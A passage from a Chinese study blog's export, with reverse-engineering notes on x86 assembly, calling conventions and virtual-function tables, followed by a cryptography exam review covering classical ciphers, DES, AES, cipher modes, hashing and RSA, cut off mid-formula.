sum;\n\tsum.Add(1, 2);\n}\n```\n\n对应汇编代码为\n\n```asm\npush ebp\nmov ebp, esp\npush ecx\npush 00000002\npush 00000001\nlea ecx, [ebp-04]\t\t;this 指针通过 ecx 寄存器传递\ncall xxxxxx\nmov esp, ebp\npop ebp\nret\n\n;sum.Add()\npush ebp\nmov ebp, esp\npush ecx\nmov [ebp-04], ecx\nmov eax, [ebp+08]\nadd eax, [ebp+0C]\nmov esp, ebp\npop ebp\nret 0008\n```\n\n**名称修饰约定**\n\n​\t为了允许使用操作符和函数重载，编译器会改写每一个入口点的符号名，从而允许同一个名字有多个用法且不会破坏现有基于 C 的链接器。\n\n#### 3. 函数返回值\n\n**return**\n\n​\t一般函数返回值放在 eax 寄存器中返回，处理结果大小超过 eax 寄存器容量，其高32位就会放到 edx 寄存器中。\n\n**参数按传引用方式返回值**\n\n​\t传值调用会建立参数一份副本，在调用函数中修改参数值复本不会影响原始变量值。传引用调用允许调用函数修改原始变量的值。调用某个函数，当吧变量地址传递给函数时，可以在函数中用间接引用运算符修改调用函数内存的单元中该变量的值。\n\n### 4.1.3 数据结构\n\n#### 1.局部变量\n\n**用栈存放**\n\n​\t用 `sub esp, 8` 语句位局部变量分配空间，用`ebp-xxxx`寻址调用这些变量，而参数调用相对于 ebp 偏移量是正的`ebp+xxxx`，在逆向时比较容易区分。编译器优化模式时，通过 esp 寄存器直接对局部变量和参数进行寻址。用`add esp, 8`来平衡栈，释放局部变量内存。\n\n[![sm41Zd.png](https://s3.ax1x.com/2021/01/07/sm41Zd.png)](https://imgchr.com/i/sm41Zd)\n\n​\t在被调用函数中，不存在 `sub esp, n`，而是通过 `push ecx` 来开辟一块栈，然后`[esp-04]`来访问这个局部变量。局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据，因此需要对其进行初始化：一是 mov 位变量赋值，二是 push 直接压栈。\n\n**寄存器**\n\n​\t除了栈占用两个寄存器，剩下6个寄存器尽可能有效存放局部变量，可以少产生代码，提高效率。寄存器不够用就会放到栈中。\n\n#### 2. 全局变量\n\n​\t一直存放在全局变量的内存区中。通常位于数据区块 .data 一个固定地址处，一般用一个**固定硬编码地址**直接对内存进行寻址。编译器一般会将全局变量放到可读写的区块里（若只可读，则就是一个常量）。在程序整个执行过程中占用内存单元。\n\n```asm\nmov eax, dword ptr [4084C0h] ;4084C0h是全局变量地址\n```\n\n​\t全局变量可被同一文件中所有函数修改，若某个函数改变了全局变量的值，就能影响到其他函数。\n\n#### 3. 数组\n\n​\t相同数据类型元素的集合，在内存中按顺序连续存放在一起，一般通过基址加变址来寻址访问。\n\n### 4.14 虚函数\n\n​\t虚函数地址只能在调用即将进行时确定，所有对虚函数 的引用通常放在虚函数表 VTBL 中，数组的每个元素中存放的就是类中虚函数的地址。调用时，先取出虚函数表指针 VPTR，得到虚函数表地址，根据这个地址到虚函数表中取出该函数地址，最后调用该函数。\n\n[![sQPuIH.png](https://s3.ax1x.com/2021/01/09/sQPuIH.png)](https://imgchr.com/i/sQPuIH)\n\n```c++\nclass CSum\n{\n    public:\n    \tvirtual int Add(int a, int b)\n            return (a+b);\n    \tvirtual int Sub(int a, int b)\n            return (a-b);\n};\nvoid main()\n{\n    CSum* pCSum = new CSum;\n    pCSum->Add(1,2);\n    pCSUm->Sub(1,2);\n}\n```\n\nVC++6.0，maximize Speed下，汇编为：\n\n```asm\n00401000: push esi\npush 4\t\ncall 00401060\t\t;new()，分配4字节内存\nadd esp, 4\t\t\t;清理栈\ntest eax, eax\t\t;查询是否分配成功\nje short 00401019\nmov dword ptr [eax], 4050A0\t;该值为CSum类虚函数表指针 VPTR\nmov esi, eax\t\t\t\t;esi=VTBL\njmp short 0040101B\n00401019: xor esi, esi\nmov eax, dword ptr [esi]\t;eax=*VTBL=**Add()\npush 2\npush 1\nmov ecx, esi\t\t\t;this 指针\ncall dword ptr [eax]\t;调用eax的值为地址里的函数Add\nmov edx, dword ptr [esi]\npush 2\npush 1\nmov ecx, esi\ncall dword ptr [edx+4]\t;Sub\npop esi\nretn\n```\n\n​\t调用 new 函数分配 class 所需的内存。调用成功后，eax 保存分配到内存的指针，然后将对象实例指向 CSum 类虚函数表 VTBL 004050A0h。\n\n[![sQB7T0.png](https://s3.ax1x.com/2021/01/09/sQB7T0.png)](https://imgchr.com/i/sQB7T0)\n\n```asm\n[VTBL]=401040h\t ;Add()\n[VTBL+4]=401050h ;Sub()\n```\n\n### 4.1.5 控制语句\n\n#### 1. if-then-else\n\n​\t整数用 cmp 指令进行比较，浮点值用 fcom、fcmp 等比较。通常为\n\n```asm\ncmp a, b\t\t;影响几个标志位：零标志位、进位标志、符号标志位、溢出标志位\njz(jnz) xxxx\n```\n\n​\t实际上，编译器使用 test、or 或 dex 这种较短逻辑指令替换 cmp。\n\n```c++\n#include<iostream>\nint main()\n{\n    int a, b=5;\n    scanf(\"%d\", &a);\n    if(a==0)\n        a=8;\n    return a+b;\n}\n```\n\nVC++6.0，maximize Speed下，汇编为：\n\n```asm\npush ecx\t\t\t\t\t;等价于 sub esp, 4\nlea eax, dword ptr [esp]\t;eax 指向局部变量空间\npush eax\t\t\t\t\t\npush 00407030\t\t\t\t;\"%d\"\ncall 00401030\t\t\t\t;scanf函数\nmov eax, dword ptr [esp+8]\t;取scanf结果到 eax\nadd esp, 00000008\t\t\t;_cdecl 调用，调用者平衡栈\ntest eax, eax\t\t\t\t\njne 00401020\t\t\t\t;ZF=0 则跳转\nmov eax, 00000008\n00401020:add eax, 00000005\npop ecx\t\t\t\t\t\t;释放局部变量内存\nret\n```\n\n#### 2. SWITCH-CASE\n\n​\t多个 IF-THEN 语句的嵌套组合\n\n#### 3. 转移指令机器码计算\n\n- Short Jump：无条件转移和条件转移机器码均为 2 字节，转移范围是 -128~127 字节。\n- Long Jump：无条件转移机器码为 5 字节，条件转移码为 6 字节（条件转移：2字节标识转移类型；其他4字节表示转移偏移量；无条件转移：1字节 jmp，4字节偏移量）。\n- call：一类调用类似于 Long Jump；另一类调用参数涉及寄存器、栈等，如`call dword ptr [eax+2]`\n\n[![slDjYV.png](https://s3.ax1x.com/2021/01/10/slDjYV.png)](https://imgchr.com/i/slDjYV)\n\n**短转移指令机器码计算**\n\n```asm\n4010000: jmp 401005\n.....\n401005: xor eax, eax\n```\n\n​\tCPU 执行完 jmp 401005，后 eip = 4010002h，执行 eip=eip+偏移量，就跳转 401005 处。所以 jmp 401005 机器码为 `EB 03`。\n\n**长转移指令机器码计算**\n\n```asm\n4010000: jmp 401005\n.....\n402398: xor eax, eax\n```\n\n位移量为 00402398h - 00401000h - 5h(长转移指令机器码长度) = 00001393h\n\n所以机器码为 `E9 93 13 00 00`\n\n\n\n若向前转移的无条件指令\n\n```asm\n4010000: xor eax, eax\n.....\n402398: jmp 401000\n```\n\n位移量为 401000h - 402398h - 5h = FFFFEC63h(取后32位)\n\n机器码为 `E9 63 EC FF FF`\n\n#### 4. 条件设置指令 SETcc\n\n​\t指令形式是 `SETcc r/m8`，r/m8 表示表示8位寄存器或单字节内存单元。\n\n[![slfm11.png](https://s3.ax1x.com/2021/01/10/slfm11.png)](https://imgchr.com/i/slfm11)\n\n```c\nc = (a < b)? c1, c2;\n```\n\n使用条件设置指令，编译器不产生包含条件分支的逻辑判断代码\n\n```asm\nxor eax, eax\ncmp a, b\nsetge al\ndec eax\nand eax, (c1-c2)\nadd eax, c2\n```\n\n#### 5. 纯算法实现逻辑判断\n\n### 4.1.6 循环语句\n\n​\t高级语言中进行反向引用的一种语言形式。确定某段代码是循环代码，就可分析其计数器，一般位 ecx 。\n\n---\n\n2021.1.10 先8学这本了"},{"title":"密码学复习","url":"/2020/01/02/密码学复习/","content":"\n## 第一章：密码体制\n\n密码体质的设计原则：密码系统的安全性不应该取决于不易改变的算法，应该取决于可随时改变的密钥\n\n五元组：M（明文）、C（密文）、K（密钥）、E（加密算法）、D（解密算法）\n\n### 密码体制分类\n\n- 🌟对称密码\n  - 序列密码（流密码）：RC4、A5等\n  - 分组密码：DES、3DES、AES、IDEA\n- 🌟公钥密码：RSA、ECC、Rabin、Elgamal\n\n对称密码体制优点：\n\n- 速度快\n- 密钥较短\n- 密文往往与明文长度相同\n\n对称密码体制缺点\n\n- 密钥分发需要安全通道\n- 密钥量大，难管理\n- 难于解决不可否认问题\n\n公钥密码体制优点：\n\n- 密钥分发相对简易\n- 密钥简单管理\n- 可以实现数字签名\n\n公钥密码体制缺点：\n\n- 加解密速度慢\n- 密钥较长\n- 密文长度往往大于明文长度\n\n### 密码分析\n\n被动攻击与主动攻击：\n\n- 被冻攻击：对一个保密系统采用截获密文进行分析，如监视、偷听等\n- 主动攻击：非法入侵者主动干扰系统，采用删除、更改、增添、重放等方法向系统加入假消息\n\n破译和攻击密码的主要方法：\n\n- 穷举攻击法（爆破）\n  - 变体：字典攻击\n- 统计分析法：根据明文、密文和密钥的统计规律来破译密码\n  - 适用于对称密码体制\n- 数学分析攻击法：针对加解密算法的数学基础和某些密码学特征，通过数学求解的方法来破译密码\n  - 适用于公钥密码体制\n\n#### 🌟根据密码分析者对明文、密文等数据资源的掌握程度，可以将密码分析攻击分为以下几种\n\n- 唯密文攻击（被动）：仅能根据截获的密文进行分析，以得出明文或密钥（如穷举和统计分析）\n- 已知明文攻击（被动）：除了有截获的密文外，还知道一些已知的“**明文-密文对**”，来破译密码\n- 选择明文攻击（主动）：除得到一些”明文-密文对”外，还可以**选择被加密的明文，并获得相应的密文**\n  - 目标：推出用来加密的密钥或者某种算法\n  - 变体：自适应选择明文攻击\n- 选择密文攻击（主动）：可以**选择一些密文，并得到相应的明文**\n  - 目标是推出密钥\n  - 多用于攻击公钥密码体制\n  - 变体：自适应选择密文攻击\n\n攻击的复杂性取决于\n\n- 数据复杂性：攻击所需要的输入数据量\n- 处理复杂性：完成攻击所需要花费的时间\n- 存储需求：所需要的数据存储空间大小\n\n**攻击的复杂性取决于以上三个因素的最小复杂度**\n\n安全的密码体制特性\n\n- **密文恢复明文**是困难的，即使知道明文空间\n- 从密文获得明文**部分信息**是困难的\n- 从密文**探测出简单有用的事实**也是困难的\n\n评价密码体制安全性的途径：\n\n- 无条件安全性（理论安全性）：分析者有无限计算能力，密码体制也不能被攻破，那么就是无条件安全\n- 计算安全性：攻破一个密码体制最好算法用现在或将来可得到的资源都不能在足够长的时间内破译，该密码体制被认为计算上安全\n- 可证明安全性：可证明安全性只是说明密码体制的安全性与一个问题相关，也成归约安全性\n\n\n\n\n\n## 第二章：古典密码\n\n### 经典密码体制分类：\n\n- 替换密码/代换密码\n  - 单表替换密码：用一个符号代替另外一个符号，一一对应\n    - 🌟移位代换密码：E<sub>k</sub>(i) ＝ i＋k(mod q) ＝ j    \tD<sub>k</sub>(j) ＝ j－k (mod q)＝i \n      - 凯撒密码\n    - 乘数密码：E<sub>k</sub>(i) ＝i ∗ k mod q＝j    D<sub>k</sub>(j)＝j ∗ k^(-1)   mod q＝i    \n    - 🌟仿射密码：以上两个的组合 C＝ k<sub>1</sub>∗m＋k<sub>2</sub> mod 26    m＝ (C-k<sub>2</sub>)∗k<sub>1</sub><sup>-1</sup> mod 26\n  - 多表替换面：多个替换包\n- 置换密码/换位密码：对符号重新排序\n\n#### 🌟Playfair密码\n\n思路：双字母转换\n\n密钥：5×5矩阵\n\n- 比如关键词为 FIVESTARS，将关键词中**重复字母去掉**，填充矩阵起始部分，之后将26字母中未出现的字母按顺序填充\n- I 和 J 作为一个字母看待\n- 密钥空间为 25\n\n对每一对明文m1, m2加密如下：\n\n- 若m1和m2**同行**，则密文c1和c2分别紧靠m1，m2**右端**的字母，其中第一列看做最后一列的右方\n- 若m1和m2**同列**，则密文c1和c2分别是紧靠m1，m2**下方**的字母，其中第一行看做最后一行的下方\n- 若m1和m2**不同行也不同列**，则c1和c2是m1，m2确定的**矩形的其他两角**的字母，并c1和m1，c2和m2同行\n- 若出现重复字母，即m1=m2，则在其中插入字母Q\n- 如明文字母是单数，将Q放在明文的末端\n\n![lALtgg.png](https://s2.ax1x.com/2019/12/26/lALtgg.png)\n\n![lALRKJ.png](https://s2.ax1x.com/2019/12/26/lALRKJ.png)\n\n#### 🌟维吉尼亚密码\n\n维吉尼亚方阵为 26×26表，加密过程：先找**明文的列**，再找**密钥的行**\n\n![img](https://img-blog.csdn.net/20150506223204325)\n\n![lAjE40.png](https://s2.ax1x.com/2019/12/26/lAjE40.png)\n\n安全性能分析步骤：\n\n- 确定密钥长度d\n  - Kasiski测试法\n  - 重合指数法\n- 确定具体的密钥字\n  - 重合互指法\n\n\n\n## 第三章：序列密码\n\n基本概念：用一个随机序列（密钥流）与明文序列按位叠加产生密文；用同一随机序列与密文序列叠加来恢复明文。\n\n![lESRWq.png](https://s2.ax1x.com/2019/12/26/lESRWq.png)\n\n种子密钥通过密钥流发生器得到的密钥流\n\n![lEpPkd.png](https://s2.ax1x.com/2019/12/26/lEpPkd.png)\n\n特点：\n\n- 加解密只是简单的模二加法运算（异或）\n- 密码安全强度依赖密钥流的安全性\n\n序列密码分类：\n\n- 同步序列密码：密钥序列的产生独立于明文消息和密文消息\n  - 无错误传输：一个错误只影响一个符号\n  - 同步：保持精确，且密钥作用位置相同才能正确解密\n- 🌟自同步序列密码：密钥序列是密钥及固定大学的以为密文的函数（密钥由以往密钥及密文生成）\n  - 有限错误传播\n  - 自同步\n  - 消除明文统计特征\n\n密钥流生成器大都基于**移位寄存器FSR**\n\n- 基于移位寄存器的密钥流序列成为**移位寄存器序列**\n- 通常由**线性移位寄存器LFSR**和一个**非线性组合函数（布尔函数）**组成一个密钥流发生器\n\n![lE9bxx.png](https://s2.ax1x.com/2019/12/26/lE9bxx.png)\n\n### 🌟线性反馈移位寄存器\n\n特点：\n\n- 非常适合硬件实现\n- 能产生大的周期序列\n- 能产生统计性好的序列\n- 能够应用代数方法分析\n\n![lECAL8.png](https://s2.ax1x.com/2019/12/26/lECAL8.png)\n\n定理：n级LFSR产生的序列有最大周期 2<sup>n</sup>-1的必要条件是**其特征多项式为不可约的**\n\n### 🌟m-序列密码的破译\n\nm-序列（周期为 2<sup>n</sup>-1）如果攻击者知道了 **2n位明密文对** ，则可确定反馈多项式的系数，从而确定LFSR接下来状态，得到余下的密钥序列\n\n![lEPbDK.png](https://s2.ax1x.com/2019/12/26/lEPbDK.png)\n\n![lEPOED.png](https://s2.ax1x.com/2019/12/26/lEPOED.png)\n\n![lEPxCd.png](https://s2.ax1x.com/2019/12/26/lEPxCd.png)\n\n\n\n伪随机性测试\n\n- 扑克牌测试\n- 游程测试\n- 接收20000个二进制位，检验1和0的核数是否大致相等\n\n常见基于LFSR的密钥序列发生器\n\n- Geffefasq\n- 钟控发生器\n- 交错停走式发生器\n- 门限发生器\n\n\n\n## 第四章：分组密码\n\n特点：速度快、安全性较高、易于标准化、便于软硬件实现\n\n分组密码设计要求：\n\n- 分组长度足够大\n- 密钥量足够大\n- 密码变换够复杂\n- 加密和解密运算简单\n- 无数据扩展和压缩\n\n设计思想：扩散和混淆，目的抵抗对密码系统的统计分析\n\n- 扩散：密钥或明文每一比特变化影响密文许多比特变化（雪崩效应）\n- 混淆：密钥和明文及密文之前依赖关系尽可能复杂，防止统计分析法\n\n## 🌟数据加密标准DES\n\n> 算法详解在课程设计中已详细展开，不再累述，这里主要讲述关于考试方面的主要内容\n\n明文分组和密文均为 **64bit** ，有效密钥为 **56bit**（另外8比特用于奇偶校验，用于检查密钥 K 在产生和分配及存储过程中可能发生的错误）。由初始置换、16轮迭代、逆初始置换组成\n\n- 初始置换和逆初始置换：通过置换表置换，没有安全意义，可忽视\n\n- 16轮迭代：每轮迭代，64位的中间结果分为左右两部分，且作为独立32位数据进行处理。每轮迭代的输入时上轮的结果 L<sub>i-1</sub> 和 R<sub>i-1</sub>。\n\n  ![lYOmGt.png](https://s2.ax1x.com/2020/01/02/lYOmGt.png)\n\n **加解密过程：**\n\n![lZeMlD.png](https://s2.ax1x.com/2019/12/27/lZeMlD.png)\n\n#### 加密函数F\n\n![lZefcF.png](https://s2.ax1x.com/2019/12/27/lZefcF.png)\n\n- E扩展置换：32bit 扩展为 48bit，每输入分组的4位作为6位输出分组的中间4位，第1位和第6位分别由相邻两个4位分组的最外面两位扩散进入本分组\n- 与子密钥异或：将48位输出与子密钥 K<sub>i</sub> 进行异或操作\n- 🌟**压缩替换 S-盒**：\n  - 由8个S-盒构成，每个S-盒都是6比特输入，4比特输出\n  - s<sub>i</sub> (h<sub>1</sub>h<sub>2</sub>h<sub>3</sub>h<sub>4</sub>h<sub>5</sub>h<sub>6</sub>) 的值是对应表 s<sub>i</sub> 中 (h<sub>1</sub>h<sub>6</sub>) 行和 (h<sub>2</sub>h<sub>3</sub>h<sub>4</sub>h<sub>5</sub>) 列上的值\n\n![lZmlCV.png](https://s2.ax1x.com/2019/12/27/lZmlCV.png)\n\n- S-盒设计准则：\n  - 有良好的非线性性（输出的每个比特与全部输入比特相关）\n  - 每一行包括所有16种4位二进制\n  - 两个输入相差1比特时，输出相差2比特等\n- P-置换：P-置换对8个S-盒的输出进行变换（对表查询变换）\n\n### 🌟DES轮运算对和性证明\n\n- 定义 T 是把64位数据的左右两半交换位置\n\n$$\nT(L,R)=(R,L)\n$$\n\n​\t\t因为\n$$\nT^2(L,R)=(L,R)=I\n$$\n​\t\t其中 I 为恒等变化，于是\n$$\nT = T^{-1}\n$$\n​\t\t所以 T 变化是对合运算\n\n- 记 DES 第 i 轮中的主要运算为\n\n$$\nF_i(L_{i-1},R_{i-1})=(L_{i-1}\\oplus f(R_{i-1},K_i),R_{i-1})\\\\\nF_i^2=F_i(L_{i-1}\\oplus f(R_{i-1},K_i),R_{i-1})\\\\\n=(L_{i-1}\\oplus f(R_{i-1},K_i)\\oplus f(R_{i-1},K_i),R_{i-1})\\\\\n=(L_{i-1},R_{i-1})\\\\\n=I\n$$\n\n​\t\t所以\n$$\nF_i=F_i^{-1}\n$$\n​\t\t所以 F<sub>i</sub> 变换也是对合变化\n\n- 结合以上两步，便可构成 DES 的轮运算\n  $$\n  H_i=F_iT\n  $$\n  因为\n  $$\n  (F_iT)(TF_i)=(F_i(TT)F_i)=F_iF_i=I\n  $$\n  所以\n  $$\n  (F_iT)^{-1}=(TF_i)\\\\\n  (F_iT)=(TF_i)^{-1}\n  $$\n  \n\n### DES的安全性\n\n主要争论为：\n\n- S-盒的设计准则、迭代次数、密钥长度等设计准则\n- 存在**弱密钥和半弱密钥**\n  - 弱密钥：初始密钥 K 使得种子秘钥两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同。这样的密钥共有4个，分别是0000000 0000000、0000000 FFFFFFF、FFFFFFF 0000000、FFFFFFF FFFFFFF \n    - E<sub>k</sub> (E<sub>k</sub> (m)) = m 和 D<sub>k</sub> (D<sub>k</sub> (m)) = m\n  - 半弱密钥：把明文加密成相同的密文，即存在两个不同的密钥，使得加密同一明文的到的结果相同。\n  - 弱密钥占比非常小，对安全性威胁不大\n- 56位密钥**无法抵抗穷举攻击**\n- 代数结构存在**互补对称性**：互补性会使DES在选择明文攻击下所需要的工作量减半，仅需要测试 2<sup>55</sup> 个密钥。\n\n$$\n\\begin{cases}\nc_{1} = E_{k}(m) \\\\\nc_{2} = E_{k}(\\overline{m}) \n\\end{cases}\n$$\n\n由互补性得到\n$$\n\\overline{c_{2}} = E_{\\overline{k}}(m)\n$$\n在穷举密钥 k 时，若输出密文是 c，则加密密钥就是所应用的密钥；若输出密文是 c 的补，则加密密钥就是所用密钥 k 的补\n\n### 多重DES分析\n\n- **双重DES**：无能抵抗中途相遇攻击\n\n$$\n加密：C = E_{K_{2}}(E_{k_{1}}(P)) \\\\\n解密：P = D_{K_{1}}(D_{k_{2}}(C)) \\\\\n由上可推出\\\\\nX = E_{k_{1}}(P) = D_{k_{2}}(C)\\\\\nX 为中间值\n$$\n\n给定明密文对 (P, C) ，将 P 按所有可能密钥 K<sub>1</sub> 加密，得到结果排列与表 T 中；将 C 用所有可能密钥 K<sub>2</sub> 解密，每解密一次就将解密结果与 T 中的值比较。**若有相等，就用刚才测试的两个密钥对 P 加密，若结果为 C 则认定这两个密钥时正确的密钥**。\n\n- **三重DES**：有四种方式，分别是 EEE3、EDE3、EEE2、EDE2，其中的数值表示密钥数量\n\n## 🌟高级加密标准AES\n\n本课程中的AES中运算按**字节**（8位二进制）定义\n\n- 一个字节看成优先于上次数小于 8 的多项式\n\n多项式加法：\n\n![lZw8xg.png](https://s2.ax1x.com/2019/12/27/lZw8xg.png)\n\n🌟**多项式乘法：**有限域 GF(2<sup>8</sup>) 中两个元素的乘法为**模** 2 元域 GF(2) 上的**一个 8 次不可约多项式的多项式**乘法。对于 AES，该8次不可约多项式为\n$$\nm(x)=x^{8}+x^{4}+x^{3}+x+1\n$$\n用十六进制表示为**{9B}**\n\n![lZwvJf.png](https://s2.ax1x.com/2019/12/27/lZwvJf.png)\n\n![lZ0Fwn.png](https://s2.ax1x.com/2019/12/27/lZ0Fwn.png)\n\n🌟**X乘法**（乘2情况）：\n\n- 最高位是 0：直接左移 1 位\n- 最高位是1：左移 1 位后和 `00011011` 异或\n\n$$\nx*B(x)=\\begin{cases}(b_{6}b_{5}b_{4}b_{3}b_{2}b_{1}b_{0}0) &\\text{b7=0} \\\\(b_{6}b_{5}b_{4}b_{3}b_{2}b_{1}b_{0}0)\\oplus(00011011)&\\text{b7=1}\\end{cases}\n$$\n\n![lZBwgU.png](https://s2.ax1x.com/2019/12/27/lZBwgU.png)\n\n**乘 3 乘法：**\n\n3 = (0000 0011)<sub>2</sub> 可以拆分为 (0000 0001)<sub>2</sub> 和 (0000 0010)<sub>2</sub> ，再将两个乘积异或：\n$$\n(0000 0011)(a_7a_6a_5a_4a_3a_2a_1a_0)\\\\\n=[(00000010)\\oplus(00000001)]*(a_7a_6a_5a_4a_3a_2a_1a_0)\\\\\n=[(00000010)*(a_7a_6a_5a_4a_3a_2a_1a_0)]\\oplus(a_7a_6a_5a_4a_3a_2a_1a_0)\n$$\n\n### AES结构\n\n- 明文按字节分成列组（共16字节）\n\n- 128位密钥被扩展成**44个字**组成的序列 W[ i ]\n\n- AES每轮有四个阶段\n\n  - 字节代换：S-盒和逆S-盒，简单查表\n  - 行移位：简单左循环移位操作，状态矩阵中，第 i 行循环左移 i 字节；逆操作则右移\n  - 🌟**列混合**：对状态矩阵逐列变换，每列视为有限域 GF(2<sup>8</sup>)上一多项式。列多项式乘以一个**固定多项式 c(x)**，对应四字节向量为（03 01 01 02），模多项式为（x<sup>4</sup> + 1）\n\n  [![luyui4.md.png](https://s2.ax1x.com/2019/12/29/luyui4.md.png)](https://imgchr.com/i/luyui4)\n\n  ![lJV39S.png](https://s2.ax1x.com/2020/01/01/lJV39S.png)\n\n  - 轮密钥加：轮密钥与状态按比特逐位异或\n\n  ![lugWfe.png](https://s2.ax1x.com/2019/12/29/lugWfe.png)\n\n- 每个阶段可逆，解密的一轮就是加密的逆执行\n\n- 加解密的最后一阶段（**第10轮**）只有三个阶段（**没有列混合**）\n\n**密钥扩展**\n\n将初始 128 位密钥，输入一个 4x4 矩阵，4 列依次为 w[ 0 ]、w[ 1 ]、w[ 2 ]、w[ 3 ]，接着对 w 数组扩充到 40 个新列，总共构成 44 列，采用以下递归方式构成\n$$\nw[i] =\\left\\{ \n\\begin{array}{}\n     w[i-4]\\oplus w[i-1] & \\text{i不是4的倍数}\\\\ \n     w[i-4]\\oplus T(w[i-1]) & \\text{i是4的倍数}\n\\end{array}\n\\right.\n$$\nT 是一个复杂函数，有字循环，字代替和轮常量异或三个组成部分，其中引用了S-盒。\n\n### IDEA和SMS4\n\n- IDEA分组大小为64位，密钥为 128 位；它的种子密钥为 128 位。在加密中，由8轮和随后的一个输出变换组成。共用 52 组 16 位的子密钥，子密钥主要通过初始密钥移位得到。\n- SMS4，分组长度 128 比特，密钥长度 128 比特，加解密采用32轮非线性迭代，加解密轮密钥顺序相反。\n\n### 🌟分组密码工作模式\n\n**电码本模式（ECB）**\n\n相同明文分组加密成相同的密文分组，明文分成 64 的分组进行加密，不足 64 位时进行填充\n\n![lKMeDP.png](https://s2.ax1x.com/2019/12/29/lKMeDP.png)\n\n特点\n\n- 简易，可并行计算，速度快\n- 相同密钥作用下，相同明文加密产生相同密文，暴露明文特征\n- 密文块缺乏相关，易受替换、重复等攻击\n\n**密码分组链接模式（CBC）**\n\n加密输入是当前明文分组和前一密文分组的异或，形成一条链。密文组不仅与当前明文组有关，且通过反馈以前的明文组有关\n\n![lKMrvR.png](https://s2.ax1x.com/2019/12/29/lKMrvR.png)\n\n![lKM6Dx.png](https://s2.ax1x.com/2019/12/29/lKM6Dx.png)\n\n🌟CBC的传播错误：\n\n- **明文有一分组有错**，会使以后的密文组都收到影响，但经过解密，除原来有误的一组外，其后各组明文都正确恢复\n- 传送过程中**某组密文出错时**，则该组恢复的明文和下一组恢复数据出错，再后面的组不受影响\n\n**密码反馈模式（CFB）**\n\n输入是 64 比特的移位寄存器，初值为初始向量 IV，输出最左边 j 比特与明文第一个单元 P<sub>1</sub> 进行异或，产生密文的第一个单元 C<sub>1</sub> 。然后将移位寄存器左移 j 位，并将 C<sub>1</sub> 送入移位寄存器的最右边 j 位，直至所有单元被加密\n\n![lKGYr9.png](https://s2.ax1x.com/2019/12/29/lKGYr9.png)\n\n![lKJezD.png](https://s2.ax1x.com/2019/12/29/lKJezD.png)\n\n优点：自同步能力强，可处理任意长度消息\n\n缺点：\n\n- **明文某一组中有错**，使以后的密文组都受影响，但经解密后，除原有误的一组外，其后各组都正确地恢复\n- **密文里的一位错误**会引起明文的一个单独错误，此错误进入移位寄存器，导致密文成为无用信息，直到该错误从移位寄存器中移出\n\n**输出反馈模式（OFB）：**\n\n反馈模式结构与CFB结构类似，不同在于\n\n- OFB模式将加密算法的输出反馈到移位寄存器\n\n![lMyh6A.png](https://s2.ax1x.com/2019/12/30/lMyh6A.png)\n\n![lMyHk8.png](https://s2.ax1x.com/2019/12/30/lMyHk8.png)\n\n特点：\n\n可加密任意长度数据，没有错误传播，适用于加密冗余度较大的数据，但对密文的篡改难以检测\n\n**计数器模式（CTR）：**\n$$\n加密：c_i = m_i \\oplus E_k(CTR+i) (i = 1,2,...,n) \\\\\n解密：m_i = c_i \\oplus E_k(CTR+i) (i=1,2,...,n)\n$$\nCTR表示计数器初值\n\n![lM6KAK.png](https://s2.ax1x.com/2019/12/30/lM6KAK.png)\n\n特点：\n\n- 随机访问特性：可随机对任一个密文分组解密，且与其他密文无关\n- 高效率：能并行处理\n- 可处理任意长度数据，仅涉及加密运算，不用实现解密算法\n\n\n\n## 第五章：哈希函数\n\n哈希函数：将任意长的消息 M 变换为较短的、固定长度的值 H(M) 的不可逆的单选密码体制，其中 H(M) 称为消息摘要，又称数字指纹\n\n基本特征：\n\n- 算法公开，无需密钥\n- 数据压缩\n- 易于计算\n- 🌟**单向性**（抗原像性）：给定消息的散列值 h(m) ，要得到消息 m 在计算上不可行\n\n**Hash 函数安全性要求：**\n\n- 抗弱碰撞性：给定消息 m ，寻找与 m 不同的消息 m' ，使得 h(m) = h(m') 在计算上不可行\n- 抗强碰撞性：寻找两个不同消息 m 和 m'，使得 h(m) = h(m') 在计算上不可行\n\n### MD5\n\n分组长度为 512 比特，最终输出 128 位（即 16 字节，32 个十六进制位）的消息摘要。\n\n过程为 4 轮，每轮 16 步，共 64 步。\n\n### SHA1\n\n最终输出 160 位（即 20 字节，40 个十六进制位）的消息摘要。（因此比 MD5 抗穷举能力更强）\n\n过程为 4 轮，每轮 20 步，共 80 步。\n\n### 🌟数据填充\n\n- 填充一个 “1” 和若干个 “0” 使消息长度**模 512 与 448 同余**。\n- 将**原始消息长度以 64 比特表示**附加在填充结果后面，使得消息长度恰好为 512 比特整数倍\n- 512 比特按 32 比特分为 16 组\n- 若原消息长度刚好满足这个条件，则再填充 512 位（1 个 1 和 511 个 0）。\n\n\n\n> 例题：给定一个三个 8 位 ASCII 字符组成的消息 “abc” ，总长度为 l = 24 位\n\n![lMIqQf.png](https://s2.ax1x.com/2019/12/30/lMIqQf.png)\n\n\n\n## 第六章：公钥密码\n\n单向陷门函数 f ：\n\n- 给出 f 定义域中的任意元素 x，计算 f(x) 是容易的\n- 给出 y = f(x) 中的 y，计算 x：\n  - 若知道 f 结合进去的信息（**陷门，也称密钥**），则 x 容易计算\n  - 若不知道该陷门信息，则 x 难以计算\n\n公钥密码应满足：\n\n- 解密算法 D 与加密算法 E 互逆，对于所有明文都有\n\n$$\nD(E(M,K_e),K_d) = M\n$$\n\n- 由 K<sub>e</sub> 求出 K<sub>d</sub> 在计算上不可行\n- 算法 E 和 D 都是高效的\n\n优点：\n\n- 密钥分发简单\n- 需保密的密钥量少\n- 可满足互不相识的人之间私人对话的保密性\n- 可实现数字签名和认证功能\n\n相对于对称密码的不足\n\n- 密码算法较慢\n- 提供更多信息对算法进行攻击\n- 数据扩展\n- 建立在特定的数学难题上，这种困难性只是一种设想\n\n## 🌟RSA\n\n### 🌟**RSA算法描述**：\n\n- 密钥生成\n  - 选择两个大素数 p 和 q，（p ≠ q，需保密）\n  - 计算 n = p x q，φ(n) = (p-1) × (q-1)\n  - 选择整数 e 使 (φ(n), e) = 1, 1 < e < φ(n)\n  - 计算 d，使得 d = e<sup>-1</sup> mod φ(n)\n  - 得到：**公钥为 {e，n}**；**私钥为 {d}**\n- 加密（用e，n）：明文 M < n，密文 C = M<sup>e</sup> (mod n)\n- 解密（用d，n）：密文 C，明文 M = C<sup>d</sup> (mod n)\n\n计算时，求 d 时，使用欧几里得扩展算法列表运算\n\n**正确性验证(欧拉定理)：**\n$$\nC^d \\mod n=(M^e)^d \\mod n\\\\=M^{ed} \\mod n\\\\=M\\mod 